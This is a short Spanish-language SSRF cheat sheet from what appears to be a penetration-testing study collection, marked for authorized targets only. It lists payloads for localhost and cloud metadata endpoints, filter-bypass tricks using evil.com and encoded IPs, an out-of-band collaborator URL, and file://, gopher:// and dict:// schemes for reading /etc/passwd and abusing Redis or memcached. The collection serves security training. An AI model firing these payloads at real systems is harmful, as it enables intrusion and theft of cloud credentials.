# Cheatsheet · SSRF

Explicación en `../../01-web/ssrf/ssrf.md`. **Solo sobre objetivos autorizados.**

## Destinos internos

```
http://127.0.0.1/          http://localhost/
http://127.0.0.1:8080/     http://[::1]/
http://169.254.169.254/latest/meta-data/       # AWS
http://metadata.google.internal/               # GCP (Header: Metadata-Flavor: Google)
```

## Bypass de filtros

```
http://127.1/                 http://0/
http://2130706433/            # 127.0.0.1 en decimal
http://0x7f000001/            # hex
http://127.0.0.1.nip.io/
http://localhost#@evil.com/   http://evil.com@127.0.0.1/
```

## Confirmación OOB

```
http://TU-COLLABORATOR/       # observa la interacción entrante
```

## Otros esquemas (si aplica)

```
file:///etc/passwd
gopher://127.0.0.1:6379/_...  # abuso de servicios internos
dict://127.0.0.1:11211/
```

## Notas

- El objetivo estrella suele ser la IP de metadatos del cloud.
- Prueba redirecciones: un endpoint tuyo que 302 a un destino interno.
